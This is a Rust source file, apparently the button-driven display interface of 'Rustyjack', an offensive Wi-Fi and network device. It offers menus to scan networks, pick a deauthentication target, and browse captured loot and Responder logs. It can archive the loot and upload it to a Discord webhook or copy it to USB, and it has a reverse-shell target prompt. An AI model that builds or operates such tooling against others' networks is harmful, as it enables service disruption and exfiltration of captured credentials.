use std::{
    fs,
    io::Write,
    path::{Path, PathBuf},
    process::Command,
    thread,
    time::Duration,
};

use anyhow::{Result, bail, Context};
use rustyjack_core::cli::{
    Commands, DiscordCommand, DiscordSendArgs,
    HardwareCommand, LootCommand, LootKind, LootListArgs, 
    LootReadArgs, NotifyCommand, SystemUpdateArgs,
    WifiCommand, WifiDeauthArgs, WifiRouteCommand, WifiScanArgs, 
    WifiStatusArgs, WifiProfileCommand, WifiProfileConnectArgs, WifiProfileDeleteArgs,
};
use rustyjack_core::InterfaceSummary;
use serde::Deserialize;
use serde_json::{self, Value};
use tempfile::{NamedTempFile, TempPath};
use walkdir::WalkDir;
use zip::{CompressionMethod, ZipWriter, write::FileOptions};

use crate::{
    config::GuiConfig,
    core::CoreBridge,
    display::{Display, DashboardView},
    input::{Button, ButtonPad},
    menu::{ColorTarget, LootSection, MenuAction, MenuEntry, MenuTree, menu_title},
    stats::StatsSampler,
};

// Response types for WiFi operations
#[derive(Debug, Deserialize)]
struct WifiNetworkEntry {
    ssid: Option<String>,
    bssid: Option<String>,
    signal_dbm: Option<i32>,
    channel: Option<u8>,
    encrypted: bool,
}

#[derive(Debug, Deserialize)]
struct WifiScanResponse {
    networks: Vec<WifiNetworkEntry>,
    count: usize,
}

#[derive(Debug, Deserialize)]
struct WifiProfileSummary {
    ssid: String,
    #[serde(default)]
    interface: Option<String>,
}

#[derive(Debug, Deserialize)]
struct WifiProfilesResponse {
    profiles: Vec<WifiProfileSummary>,
}

#[derive(Debug, Deserialize)]
struct WifiListResponse {
    interfaces: Vec<InterfaceSummary>,
}

#[derive(Debug, Deserialize)]
struct RouteSnapshot {
    #[serde(default)]
    default_gateway: Option<String>,
    #[serde(default)]
    default_interface: Option<String>,
}

#[derive(Debug, Deserialize)]
struct WifiStatusOverview {
    #[serde(default)]
    connected: bool,
    #[serde(default)]
    ssid: Option<String>,
    #[serde(default)]
    interface: Option<String>,
    #[serde(default)]
    signal_dbm: Option<i32>,
}

pub struct App {
    core: CoreBridge,
    display: Display,
    buttons: ButtonPad,
    config: GuiConfig,
    menu: MenuTree,
    menu_state: MenuState,
    stats: StatsSampler,
    root: PathBuf,
    dashboard_view: Option<DashboardView>,
}

// Map low-level Button values to higher-level ButtonAction values
impl App {
    fn map_button(&self, b: Button) -> ButtonAction {
        match b {
            Button::Up => ButtonAction::Up,
            Button::Down => ButtonAction::Down,
            Button::Left => ButtonAction::Back,
            Button::Right | Button::Select => ButtonAction::Select,
            Button::Key1 => ButtonAction::Refresh,
            Button::Key2 => ButtonAction::MainMenu,
            Button::Key3 => ButtonAction::Reboot,
        }
    }

    fn confirm_reboot(&mut self) -> Result<()> {
        // Ask the user to confirm reboot — waits for explicit confirmation
        let overlay = self.stats.snapshot();
        let content = vec![
            "Confirm reboot".to_string(),
            "SELECT = Reboot".to_string(),
            "LEFT = Cancel".to_string(),
        ];

        self.display.draw_dialog(&content, &overlay)?;

        loop {
            let button = self.buttons.wait_for_press()?;
            match self.map_button(button) {
                ButtonAction::Select => {
                    // Run reboot command and then exit
                    let _ = Command::new("systemctl").arg("reboot").status();
                    // If the command succeeded the system will reboot; exit the app regardless.
                    std::process::exit(0);
                }
                ButtonAction::Back | ButtonAction::MainMenu => {
                    // Cancel and return
                    break;
                }
                ButtonAction::Refresh => {
                    // redraw the dialog
                    self.display.draw_dialog(&content, &overlay)?;
                }
                _ => {}
            }
        }
        Ok(())
    }
}

struct MenuState {
    stack: Vec<String>,
    selection: usize,
    // Scroll offset for current menu view — ensures selection stays visible
    offset: usize,
}

impl MenuState {
    fn new() -> Self {
        Self {
            stack: vec!["a".to_string()],
            selection: 0,
            offset: 0,
        }
    }

    fn current_id(&self) -> &str {
        self.stack.last().map(|s| s.as_str()).unwrap_or("a")
    }

    fn enter(&mut self, id: &str) {
        self.stack.push(id.to_string());
        self.selection = 0;
        self.offset = 0;
    }

    fn back(&mut self) {
        if self.stack.len() > 1 {
            self.stack.pop();
            self.selection = 0;
            self.offset = 0;
        }
    }

    fn move_up(&mut self, total: usize) {
        if total == 0 {
            self.selection = 0;
            return;
        }
        if self.selection == 0 {
            self.selection = total - 1;
        } else {
            self.selection -= 1;
        }
        // Ensure selection is inside visible window
        const VISIBLE: usize = 7;
        if self.selection < self.offset {
            self.offset = self.selection;
        } else if self.selection >= self.offset + VISIBLE {
            self.offset = self.selection.saturating_sub(VISIBLE - 1);
        }
    }

    fn move_down(&mut self, total: usize) {
        if total == 0 {
            self.selection = 0;
            return;
        }
        self.selection = (self.selection + 1) % total;
        // Ensure selection is inside visible window
        const VISIBLE: usize = 7;
        if self.selection < self.offset {
            self.offset = self.selection;
        } else if self.selection >= self.offset + VISIBLE {
            self.offset = self.selection.saturating_sub(VISIBLE - 1);
        }
    }

    fn home(&mut self) {
        self.stack = vec!["a".to_string()];
        self.selection = 0;
        self.offset = 0;
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ButtonAction {
    Up,
    Down,
    Back,
    Select,
    Refresh,
    MainMenu,
    Reboot,
}

impl App {
    pub fn new() -> Result<Self> {
        let core = CoreBridge::with_root(None)?;
        let root = core.root().to_path_buf();
        let config = GuiConfig::load(&root)?;
        let mut display = Display::new(&config.colors)?;
        let buttons = ButtonPad::new(&config.pins)?;
        
        // Show splash screen during initialization
        let splash_path = root.join("img").join("rustyjack.png");
        let _ = display.show_splash_screen(&splash_path);
        
        // Let splash show while stats sampler starts up
        let stats = StatsSampler::spawn(core.clone());
        
        // Give splash screen time to be visible (1.5 seconds)
        thread::sleep(Duration::from_millis(1500));

        Ok(Self {
            core,
            display,
            buttons,
            config,
            menu: MenuTree::new(),
            menu_state: MenuState::new(),
            stats,
            root,
            dashboard_view: None,
        })
    }

    pub fn run(mut self) -> Result<()> {
        loop {
            if let Some(view) = self.dashboard_view {
                // Dashboard mode
                let status = self.stats.snapshot();
                self.display.draw_dashboard(view, &status)?;
                
                let button = self.buttons.wait_for_press()?;
                match self.map_button(button) {
                    ButtonAction::Back => {
                        // Exit dashboard, return to menu
                        self.dashboard_view = None;
                    }
                    ButtonAction::Select => {
                        // Cycle to next dashboard
                        self.dashboard_view = Some(match view {
                            DashboardView::SystemHealth => DashboardView::AttackMetrics,
                            DashboardView::AttackMetrics => DashboardView::LootSummary,
                            DashboardView::LootSummary => DashboardView::NetworkTraffic,
                            DashboardView::NetworkTraffic => DashboardView::SystemHealth,
                        });
                    }
                    ButtonAction::Refresh => {
                        // force redraw; nothing else required (loop will redraw)
                    }
                    ButtonAction::MainMenu => {
                        self.menu_state.home();
                    }
                    ButtonAction::Reboot => {
                        self.confirm_reboot()?;
                    }
                    _ => {}
                }
            } else {
                // Menu mode
                let entries = self.render_menu()?;
                let button = self.buttons.wait_for_press()?;
                match self.map_button(button) {
                    ButtonAction::Up => self.menu_state.move_up(entries.len()),
                    ButtonAction::Down => self.menu_state.move_down(entries.len()),
                    ButtonAction::Back => self.menu_state.back(),
                    ButtonAction::Select => {
                        if let Some(entry) = entries.get(self.menu_state.selection) {
                            let action = entry.action.clone();
                            self.execute_action(action)?;
                        }
                    }
                    ButtonAction::Refresh => {
                        // Force refresh — nothing required here because the loop redraws
                    }
                    ButtonAction::MainMenu => self.menu_state.home(),
                    ButtonAction::Reboot => self.confirm_reboot()?,
                }
            }
        }
    }

    fn render_menu(&mut self) -> Result<Vec<MenuEntry>> {
        let mut entries = self.menu.entries(self.menu_state.current_id())?;
        
        // Dynamic label updates
        for entry in &mut entries {
            if let MenuAction::ToggleDiscord = entry.action {
                let state = if self.config.settings.discord_enabled { "ON" } else { "OFF" };
                entry.label = format!(" Discord Webhook [{}]", state);
            }
        }

        if entries.is_empty() {
            entries.push(MenuEntry {
                label: " Nothing here".to_string(),
                action: MenuAction::ShowInfo,
            });
        }
        if self.menu_state.selection >= entries.len() {
            self.menu_state.selection = entries.len().saturating_sub(1);
        }
        let status = self.stats.snapshot();
        // When there are more entries than fit on-screen, show a sliding window
        // so the selected item is always visible. MenuState::offset tracks the
        // first item index in the current view.
        const VISIBLE: usize = 7;
        let total = entries.len();
        if self.menu_state.selection >= total && total > 0 {
            self.menu_state.selection = total - 1;
        }
        // clamp offset
        if self.menu_state.offset >= total {
            self.menu_state.offset = 0;
        }

        let start = self.menu_state.offset.min(total);
        let _end = (start + VISIBLE).min(total);

        let labels: Vec<String> = entries
            .iter()
            .skip(start)
            .take(VISIBLE)
            .map(|entry| entry.label.clone())
            .collect();

        // selected index relative to the slice
        let displayed_selected = if total == 0 { 0 } else { self.menu_state.selection.saturating_sub(start) };

        self.display.draw_menu(
            menu_title(self.menu_state.current_id()),
            &labels,
            displayed_selected,
            &status,
        )?;
        Ok(entries)
    }

    fn execute_action(&mut self, action: MenuAction) -> Result<()> {
        match action {
            MenuAction::Submenu(id) => self.menu_state.enter(id),
            MenuAction::RefreshConfig => self.reload_config()?,
            MenuAction::SaveConfig => self.save_config()?,
            MenuAction::SetColor(target) => self.pick_color(target)?,
            MenuAction::RestartSystem => self.restart_system()?,
            MenuAction::Loot(section) => self.show_loot(section)?,
            MenuAction::DiscordUpload => self.discord_upload()?,
            MenuAction::SystemUpdate => self.run_system_update()?,
            MenuAction::ViewDashboards => {
                self.dashboard_view = Some(DashboardView::SystemHealth);
            }
            MenuAction::ToggleDiscord => self.toggle_discord()?,
            MenuAction::TransferToUSB => self.transfer_to_usb()?,
            MenuAction::HardwareDetect => self.show_hardware_detect()?,
            MenuAction::ScanNetworks => self.scan_wifi_networks()?,
            MenuAction::DeauthAttack => self.launch_deauth_attack()?,
            MenuAction::ConnectKnownNetwork => self.connect_known_network()?,
            MenuAction::ShowInfo => {} // No-op for informational entries
        }
        Ok(())
    }

    fn simple_command(&mut self, command: Commands, success: &str) -> Result<()> {
        if let Err(err) = self.core.dispatch(command) {
            self.show_message("Error", [format!("{err}")])?;
        } else {
            self.show_message("Success", [success.to_string()])?;
        }
        Ok(())
    }

    fn show_message<I, S>(&mut self, title: &str, lines: I) -> Result<()>
    where
        I: IntoIterator<Item = S>,
        S: AsRef<str>,
    {
        let overlay = self.stats.snapshot();
        let content: Vec<String> = std::iter::once(title.to_string())
            .chain(lines.into_iter().map(|line| line.as_ref().to_string()))
            .collect();
        // Draw the dialog and require an explicit button press to dismiss
        self.display.draw_dialog(&content, &overlay)?;
        loop {
            let button = self.buttons.wait_for_press()?;
            match self.map_button(button) {
                ButtonAction::Select | ButtonAction::Back => break,
                ButtonAction::MainMenu => {
                    self.menu_state.home();
                    break;
                }
                ButtonAction::Refresh => {
                    // redraw the dialog so user can refresh view content if desired
                    self.display.draw_dialog(&content, &overlay)?;
                }
                ButtonAction::Reboot => {
                    // confirm and perform reboot if accepted
                    self.confirm_reboot()?;
                    break;
                }
                _ => {}
            }
        }
        Ok(())
    }
    
    fn show_progress<I, S>(&mut self, title: &str, lines: I) -> Result<()>
    where
        I: IntoIterator<Item = S>,
        S: AsRef<str>,
    {
        let overlay = self.stats.snapshot();
        let content: Vec<String> = std::iter::once(title.to_string())
            .chain(lines.into_iter().map(|line| line.as_ref().to_string()))
            .collect();
        self.display.draw_dialog(&content, &overlay)?;
        Ok(())
    }
    
    fn execute_with_progress<F, T>(&mut self, title: &str, message: &str, operation: F) -> Result<T>
    where
        F: FnOnce() -> Result<T>,
    {
        self.show_progress(title, [message, "Please wait..."])?;
        let result = operation();
        result
    }

    fn reload_config(&mut self) -> Result<()> {
        self.config = GuiConfig::load(&self.root)?;
        self.display.update_palette(&self.config.colors);
        self.show_message("Config", ["Reloaded"])
    }

    fn save_config(&mut self) -> Result<()> {
        self.config.save(&self.root.join("gui_conf.json"))?;
        self.show_message("Config", ["Saved"])
    }

    fn pick_color(&mut self, target: ColorTarget) -> Result<()> {
        let choices = [
            ("White", "#ffffff"),
            ("Black", "#000000"),
            ("Green", "#05ff00"),
            ("Red", "#ff0000"),
            ("Blue", "#2d0fff"),
            ("Navy", "#141494"),
        ];
        let mut index = 0;
        loop {
            let overlay = self.stats.snapshot();
            let (name, hex) = choices[index];
            let label = format!("{:?}: {}", target, name);
            self.display.draw_dialog(&[label.clone()], &overlay)?;
            let button = self.buttons.wait_for_press()?;
            match self.map_button(button) {
                ButtonAction::Back => index = (index + choices.len() - 1) % choices.len(),
                ButtonAction::Select => {
                    self.apply_color(target.clone(), hex);
                    self.display
                        .draw_dialog(&["Color updated".into()], &overlay)?;
                    thread::sleep(Duration::from_millis(600));
                    break;
                }
                ButtonAction::Reboot => {
                    self.confirm_reboot()?;
                }
                _ => {}
            }
        }
        Ok(())
    }

    fn apply_color(&mut self, target: ColorTarget, value: &str) {
        match target {
            ColorTarget::Background => self.config.colors.background = value.to_string(),
            ColorTarget::Border => self.config.colors.border = value.to_string(),
            ColorTarget::Text => self.config.colors.text = value.to_string(),
            ColorTarget::SelectedText => self.config.colors.selected_text = value.to_string(),
            ColorTarget::SelectedBackground => {
                self.config.colors.selected_background = value.to_string()
            }
        }
        self.display.update_palette(&self.config.colors);
    }

    fn show_loot(&mut self, section: LootSection) -> Result<()> {
        let kind = match section {
            LootSection::Wireless => LootKind::Wireless,
        };
        let (_, data) = self
            .core
            .dispatch(Commands::Loot(LootCommand::List(LootListArgs { kind })))?;
        let files = data
            .get("files")
            .and_then(Value::as_array)
            .cloned()
            .unwrap_or_default();
        if files.is_empty() {
            return self.show_message("Loot", ["No files"]);
        }
        let mut paths = Vec::new();
        let mut labels = Vec::new();
        for entry in &files {
            if let Some(path) = entry.get("path").and_then(Value::as_str) {
                let display = Path::new(path)
                    .file_name()
                    .and_then(|n| n.to_str())
                    .unwrap_or(path)
                    .to_string();
                paths.push(path.to_string());
                labels.push(display);
            }
        }
        
        // Interactive file browser - keeps looping until user backs out
        loop {
            let Some(index) = self.choose_from_menu("Loot files", &labels)? else {
                return Ok(());
            };
            let path = paths.get(index).cloned().unwrap_or_else(|| paths.first().cloned().unwrap());
            
            // Open the selected file in scrollable viewer
            self.view_loot_file(&path)?;
        }
    }
    
    fn view_loot_file(&mut self, path: &str) -> Result<()> {
        // Read the file with a high line limit
        let read_args = LootReadArgs {
            path: PathBuf::from(path),
            max_lines: 5000,
        };
        let (_, data) = self
            .core
            .dispatch(Commands::Loot(LootCommand::Read(read_args)))?;
        
        let lines = data
            .get("lines")
            .and_then(Value::as_array)
            .map(|arr| {
                arr.iter()
                    .filter_map(Value::as_str)
                    .map(|s| s.to_string())
                    .collect::<Vec<_>>()
            })
            .unwrap_or_default();
        
        let truncated = data
            .get("truncated")
            .and_then(Value::as_bool)
            .unwrap_or(false);
        
        if lines.is_empty() {
            return self.show_message("Loot", ["File is empty"]);
        }
        
        let filename = Path::new(path)
            .file_name()
            .and_then(|n| n.to_str())
            .unwrap_or("file")
            .to_string();
        
        // Scrollable file viewer
        self.scrollable_text_viewer(&filename, &lines, truncated)
    }
    
    fn scrollable_text_viewer(&mut self, title: &str, lines: &[String], truncated: bool) -> Result<()> {
        const LINES_PER_PAGE: usize = 9;
        let total_lines = lines.len();
        let mut offset = 0;
        
        loop {
            let overlay = self.stats.snapshot();
            let end = (offset + LINES_PER_PAGE).min(total_lines);
            let visible_lines: Vec<String> = lines[offset..end].to_vec();
            
            // Build display content with navigation hints
            let mut content = vec![
                format!("{} ({}/{})", title, offset + 1, total_lines),
            ];
            content.extend(visible_lines);
            
            // Add navigation hint
            if offset + LINES_PER_PAGE < total_lines {
                content.push("-- More below --".to_string());
            } else if truncated {
                content.push("[File truncated]".to_string());
            }
            
            self.display.draw_dialog(&content, &overlay)?;
            
            let button = self.buttons.wait_for_press()?;
            match self.map_button(button) {
                ButtonAction::Down => {
                    // Scroll down by one line
                    if offset + LINES_PER_PAGE < total_lines {
                        offset += 1;
                    }
                }
                ButtonAction::Up => {
                    // Scroll up by one line
                    if offset > 0 {
                        offset = offset.saturating_sub(1);
                    }
                }
                ButtonAction::Select => {
                    // Page down
                    if offset + LINES_PER_PAGE < total_lines {
                        offset = (offset + LINES_PER_PAGE).min(total_lines.saturating_sub(LINES_PER_PAGE));
                    }
                }
                ButtonAction::Back => {
                    // Exit viewer and return to file list
                    return Ok(());
                }
                ButtonAction::MainMenu => {
                    self.menu_state.home();
                    return Ok(());
                }
                ButtonAction::Refresh => {
                    // Redraw current page
                }
                ButtonAction::Reboot => {
                    self.confirm_reboot()?;
                }
            }
        }
    }

    fn restart_system(&mut self) -> Result<()> {
        Command::new("reboot")
            .status()
            .ok();
        Ok(())
    }

    fn choose_from_list(&mut self, title: &str, items: &[String]) -> Result<Option<usize>> {
        if items.is_empty() {
            return Ok(None);
        }
        let mut index = 0usize;
        loop {
            let overlay = self.stats.snapshot();
            let content = vec![title.to_string(), items[index].clone()];
            self.display.draw_dialog(&content, &overlay)?;
            let button = self.buttons.wait_for_press()?;
            match self.map_button(button) {
                ButtonAction::Up => {
                    if index == 0 {
                        index = items.len() - 1;
                    } else {
                        index -= 1;
                    }
                }
                ButtonAction::Down => index = (index + 1) % items.len(),
                ButtonAction::Select => return Ok(Some(index)),
                ButtonAction::Back => return Ok(None),
                ButtonAction::MainMenu => {
                    self.menu_state.home();
                    return Ok(None);
                }
                ButtonAction::Reboot => {
                    self.confirm_reboot()?;
                }
                _ => {}
            }
        }
    }

    /// Show a paginated menu (styled like the main menu) and return index
    fn choose_from_menu(&mut self, title: &str, items: &[String]) -> Result<Option<usize>> {
        if items.is_empty() {
            return Ok(None);
        }

        const VISIBLE: usize = 7;
        let mut index: usize = 0;
        let mut offset: usize = 0;

        loop {
            let total = items.len();
            // Clamp offset so selected is visible
            if index < offset {
                offset = index;
            } else if index >= offset + VISIBLE {
                offset = index.saturating_sub(VISIBLE - 1);
            }

            let overlay = self.stats.snapshot();

            // Build window slice of labels
            let slice: Vec<String> = items.iter().skip(offset).take(VISIBLE).cloned().collect();
            // Display menu with selected relative index
            let displayed_selected = index.saturating_sub(offset);
            self.display.draw_menu(title, &slice, displayed_selected, &overlay)?;

            let button = self.buttons.wait_for_press()?;
            match self.map_button(button) {
                ButtonAction::Up => {
                    if index == 0 { index = total - 1; } else { index -= 1; }
                }
                ButtonAction::Down => index = (index + 1) % total,
                ButtonAction::Select => return Ok(Some(index)),
                ButtonAction::Back => return Ok(None),
                ButtonAction::MainMenu => { self.menu_state.home(); return Ok(None); }
                ButtonAction::Reboot => { self.confirm_reboot()?; }
                _ => {}
            }
        }
    }

    fn prompt_octet(&mut self, prefix: &str) -> Result<Option<u8>> {
        let mut value: i32 = 1;
        loop {
            let overlay = self.stats.snapshot();
            let content = vec![
                "Reverse shell target".to_string(),
                format!("{prefix}.{}", value.clamp(0, 255)),
                "UP/DOWN to adjust".to_string(),
                "OK to confirm".to_string(),
            ];
            self.display.draw_dialog(&content, &overlay)?;
            let button = self.buttons.wait_for_press()?;
            match self.map_button(button) {
                ButtonAction::Up => value = (value + 1).min(255),
                ButtonAction::Down => value = (value - 1).max(0),
                ButtonAction::Select => return Ok(Some(value as u8)),
                ButtonAction::Back => return Ok(None),
                ButtonAction::MainMenu => {
                    self.menu_state.home();
                    return Ok(None);
                }
                ButtonAction::Reboot => {
                    self.confirm_reboot()?;
                }
                _ => {}
            }
        }
    }

    fn handle_network_selection(&mut self, network: &WifiNetworkEntry) -> Result<()> {
        let Some(ssid) = network
            .ssid
            .as_deref()
            .filter(|s| !s.is_empty())
            .map(|s| s.to_string())
        else {
            self.show_message("Wi-Fi", ["Hidden SSID - configure via CLI"])?;
            return Ok(());
        };
        let mut details = vec![format!("SSID: {ssid}")];
        if let Some(signal) = network.signal_dbm {
            details.push(format!("Signal: {signal} dBm"));
        }
        if let Some(channel) = network.channel {
            details.push(format!("Channel: {channel}"));
        }
        if let Some(bssid) = network.bssid.as_deref() {
            details.push(format!("BSSID: {bssid}"));
        }
        details.push(if network.encrypted {
            "Encrypted: yes".to_string()
        } else {
            "Encrypted: no".to_string()
        });
        self.show_message("Network", details.iter().map(|s| s.as_str()))?;

        let actions = vec!["Connect".to_string(), "Set as Target".to_string(), "Back".to_string()];
        if let Some(choice) = self.choose_from_list("Network action", &actions)? {
            match choice {
                0 => {
                    // Connect
                    if self.connect_profile_by_ssid(&ssid)? {
                        // message handled in helper
                    } else {
                        let msg = vec![format!("No saved profile for {ssid}")];
                        self.show_message("Wi-Fi", msg.iter().map(|s| s.as_str()))?;
                    }
                }
                1 => {
                    // Set as Target for deauth attack
                    self.config.settings.target_network = ssid.clone();
                    self.config.settings.target_bssid = network.bssid.clone().unwrap_or_default();
                    self.config.settings.target_channel = network.channel.unwrap_or(0) as u8;
                    
                    // Save config
                    let config_path = self.root.join("gui_conf.json");
                    if let Err(e) = self.config.save(&config_path) {
                        self.show_message("Error", [format!("Failed to save: {}", e)])?;
                    } else {
                        self.show_message("Target Set", [
                            &format!("SSID: {}", ssid),
                            &format!("BSSID: {}", self.config.settings.target_bssid),
                            &format!("Channel: {}", self.config.settings.target_channel),
                            "",
                            "Ready for Deauth Attack"
                        ])?;
                    }
                }
                _ => {}
            }
        }
        Ok(())
    }

    fn handle_profile_selection(&mut self, profile: &WifiProfileSummary) -> Result<()> {
        let actions = vec![
            "Connect".to_string(),
            "Delete".to_string(),
            "Back".to_string(),
        ];
        if let Some(choice) =
            self.choose_from_list(&format!("Profile {}", profile.ssid), &actions)?
        {
            match choice {
                0 => self.connect_named_profile(&profile.ssid)?,
                1 => self.delete_profile(&profile.ssid)?,
                _ => {}
            }
        }
        Ok(())
    }

    fn fetch_wifi_scan(&mut self) -> Result<WifiScanResponse> {
        let args = WifiScanArgs { interface: None };
        let (_, data) = self
            .core
            .dispatch(Commands::Wifi(WifiCommand::Scan(args)))?;
        let resp: WifiScanResponse = serde_json::from_value(data)?;
        Ok(resp)
    }

    fn fetch_wifi_profiles(&mut self) -> Result<Vec<WifiProfileSummary>> {
        let (_, data) = self.core.dispatch(Commands::Wifi(WifiCommand::Profile(
            WifiProfileCommand::List,
        )))?;
        let resp: WifiProfilesResponse = serde_json::from_value(data)?;
        Ok(resp.profiles)
    }

    fn fetch_wifi_interfaces(&mut self) -> Result<Vec<InterfaceSummary>> {
        let (_, data) = self.core.dispatch(Commands::Wifi(WifiCommand::List))?;
        let resp: WifiListResponse = serde_json::from_value(data)?;
        Ok(resp.interfaces)
    }

    fn fetch_route_snapshot(&mut self) -> Result<RouteSnapshot> {
        let (_, data) = self
            .core
            .dispatch(Commands::Wifi(WifiCommand::Route(WifiRouteCommand::Status)))?;
        let resp: RouteSnapshot = serde_json::from_value(data)?;
        Ok(resp)
    }

    fn fetch_wifi_status(&mut self) -> Result<WifiStatusOverview> {
        let args = WifiStatusArgs { interface: None };
        let (_, data) = self
            .core
            .dispatch(Commands::Wifi(WifiCommand::Status(args)))?;
        let status: WifiStatusOverview = serde_json::from_value(data)?;
        Ok(status)
    }

    fn connect_profile_by_ssid(&mut self, ssid: &str) -> Result<bool> {
        let profiles = self.fetch_wifi_profiles()?;
        if !profiles.iter().any(|profile| profile.ssid == ssid) {
            return Ok(false);
        }
        self.connect_named_profile(ssid)?;
        Ok(true)
    }

    fn connect_named_profile(&mut self, ssid: &str) -> Result<()> {
        self.show_progress("Wi-Fi", ["Connecting...", ssid, "Please wait"])?;
        
        let args = WifiProfileConnectArgs {
            profile: Some(ssid.to_string()),
            ssid: None,
            password: None,
            interface: None,
            remember: false,
        };
        
        match self.core.dispatch(Commands::Wifi(WifiCommand::Profile(
            WifiProfileCommand::Connect(args),
        ))) {
            Ok(_) => {
                let msg = vec![format!("Connected to {ssid}")];
                self.show_message("Wi-Fi", msg.iter().map(|s| s.as_str()))?;
            }
            Err(err) => {
                let msg = vec![format!("Connection failed:"), format!("{err}")];
                self.show_message("Wi-Fi error", msg.iter().map(|s| s.as_str()))?;
            }
        }
        Ok(())
    }

    fn delete_profile(&mut self, ssid: &str) -> Result<()> {
        let args = WifiProfileDeleteArgs {
            ssid: ssid.to_string(),
        };
        match self.core.dispatch(Commands::Wifi(WifiCommand::Profile(
            WifiProfileCommand::Delete(args),
        ))) {
            Ok(_) => {
                let msg = vec![format!("Deleted {ssid}")];
                self.show_message("Wi-Fi", msg.iter().map(|s| s.as_str()))?;
            }
            Err(err) => {
                let msg = vec![format!("{err}")];
                self.show_message("Wi-Fi error", msg.iter().map(|s| s.as_str()))?;
            }
        }
        Ok(())
    }

    fn discord_upload(&mut self) -> Result<()> {
        let (temp_path, archive_path) = self.build_loot_archive()?;
        let args = DiscordSendArgs {
            title: "Rustyjack Loot".to_string(),
            message: Some("Complete loot archive".to_string()),
            file: Some(archive_path.clone()),
            target: None,
            interface: None,
        };
        let result = self.core.dispatch(Commands::Notify(NotifyCommand::Discord(
            DiscordCommand::Send(args),
        )));
        drop(temp_path);
        match result {
            Ok(_) => self.show_message("Discord", ["Loot uploaded"])?,
            Err(err) => {
                let msg = err.to_string();
                self.show_message("Discord", [msg.as_str()])?;
            }
        }
        Ok(())
    }

    fn transfer_to_usb(&mut self) -> Result<()> {
        // Find USB mount point
        let usb_path = match self.find_usb_mount() {
            Ok(path) => path,
            Err(_e) => {
                self.show_message("USB Transfer Error", [
                    "No USB drive detected",
                    "Please insert a USB drive",
                    "and try again"
                ])?;
                return Ok(());
            }
        };
        
        let loot_dir = self.root.join("loot");
        let responder_logs = self.root.join("Responder").join("logs");
        
        if !loot_dir.exists() && !responder_logs.exists() {
            self.show_message("USB Transfer", ["No loot to transfer"])?;
            return Ok(());
        }

        // Collect all files to transfer
        let mut files = Vec::new();
        if loot_dir.exists() {
            for entry in WalkDir::new(&loot_dir) {
                let entry = entry?;
                if entry.file_type().is_file() {
                    files.push(entry.path().to_path_buf());
                }
            }
        }
        if responder_logs.exists() {
            for entry in WalkDir::new(&responder_logs) {
                let entry = entry?;
                if entry.file_type().is_file() {
                    files.push(entry.path().to_path_buf());
                }
            }
        }

        if files.is_empty() {
            self.show_message("USB Transfer", ["No files to transfer"])?;
            return Ok(());
        }

        let total_files = files.len();
        let status = self.stats.snapshot();

        // Transfer files with progress
        for (idx, file_path) in files.iter().enumerate() {
            let progress = ((idx + 1) as f32 / total_files as f32) * 100.0;
            
            let filename = file_path.file_name()
                .and_then(|n| n.to_str())
                .unwrap_or("file");
            
            self.display.draw_progress_dialog(
                "USB Transfer",
                filename,
                progress,
                &status
            )?;

            // Determine destination path
            let dest = if file_path.starts_with(&loot_dir) {
                let rel = file_path.strip_prefix(&loot_dir).unwrap_or(file_path);
                usb_path.join("Rustyjack_Loot").join("loot").join(rel)
            } else if file_path.starts_with(&responder_logs) {
                let rel = file_path.strip_prefix(&responder_logs).unwrap_or(file_path);
                usb_path.join("Rustyjack_Loot").join("ResponderLogs").join(rel)
            } else {
                continue;
            };

            // Create destination directory
            if let Some(parent) = dest.parent() {
                fs::create_dir_all(parent)?;
            }

            // Copy file
            fs::copy(file_path, &dest)?;
        }

        self.show_message("USB Transfer", [
            &format!("Transferred {} files", total_files),
            "to USB drive"
        ])?;
        
        Ok(())
    }

    fn find_usb_mount(&self) -> Result<PathBuf> {
        // First, find USB block devices by checking /sys/block/
        let usb_devices = self.find_usb_block_devices();
        
        if usb_devices.is_empty() {
            bail!("No USB storage device detected. Please insert a USB drive.");
        }
        
        // Now find mount points for these USB devices
        let mounts = self.read_mount_points()?;
        
        for usb_dev in &usb_devices {
            // Check for partitions (e.g., sda1, sdb1) or the device itself
            for (device, mount_point) in &mounts {
                // Match if device starts with the USB device name (handles partitions)
                // e.g., /dev/sda1 starts with "sda"
                let dev_name = device.strip_prefix("/dev/").unwrap_or(device);
                if dev_name.starts_with(usb_dev) {
                    // Verify it's writable
                    if self.is_writable_mount(Path::new(mount_point)) {
                        return Ok(PathBuf::from(mount_point));
                    }
                }
            }
        }
        
        // Fallback: check common mount points but be more selective
        let mount_points = [
            "/media",
            "/mnt",
            "/run/media",
        ];

        for base in &mount_points {
            let base_path = Path::new(base);
            if !base_path.exists() {
                continue;
            }

            // Iterate through subdirectories (usually named after user or device)
            if let Ok(entries) = fs::read_dir(base_path) {
                for entry in entries.flatten() {
                    let path = entry.path();
                    if path.is_dir() {
                        // For /media and /run/media, check subdirectories too (user folders)
                        if let Ok(sub_entries) = fs::read_dir(&path) {
                            for sub_entry in sub_entries.flatten() {
                                let sub_path = sub_entry.path();
                                if sub_path.is_dir() && self.is_usb_storage_mount(&sub_path) {
                                    return Ok(sub_path);
                                }
                            }
                        }
                        // Also check direct mount
                        if self.is_usb_storage_mount(&path) {
                            return Ok(path);
                        }
                    }
                }
            }
        }

        bail!("No USB storage drive found. Please insert a USB drive.")
    }
    
    /// Find USB block devices by checking /sys/block/ for removable USB devices
    fn find_usb_block_devices(&self) -> Vec<String> {
        let mut usb_devices = Vec::new();
        
        let sys_block = Path::new("/sys/block");
        if !sys_block.exists() {
            return usb_devices;
        }
        
        if let Ok(entries) = fs::read_dir(sys_block) {
            for entry in entries.flatten() {
                let name = entry.file_name().to_string_lossy().to_string();
                
                // Skip loop devices, ram disks, and mmcblk (SD cards - usually the boot drive)
                if name.starts_with("loop") || name.starts_with("ram") || name.starts_with("mmcblk") {
                    continue;
                }
                
                // Check if it's a removable device
                let removable_path = entry.path().join("removable");
                let is_removable = fs::read_to_string(&removable_path)
                    .map(|s| s.trim() == "1")
                    .unwrap_or(false);
                
                // Check if it's a USB device by looking at the device path
                let device_path = entry.path().join("device");
                let is_usb = if device_path.exists() {
                    // Follow symlink and check if path contains "usb"
                    fs::read_link(&device_path)
                        .map(|p| p.to_string_lossy().contains("usb"))
                        .unwrap_or(false)
                } else {
                    false
                };
                
                // Also check uevent for DRIVER=usb-storage
                let uevent_path = entry.path().join("device").join("uevent");
                let is_usb_storage = fs::read_to_string(&uevent_path)
                    .map(|s| s.contains("usb-storage") || s.contains("usb"))
                    .unwrap_or(false);
                
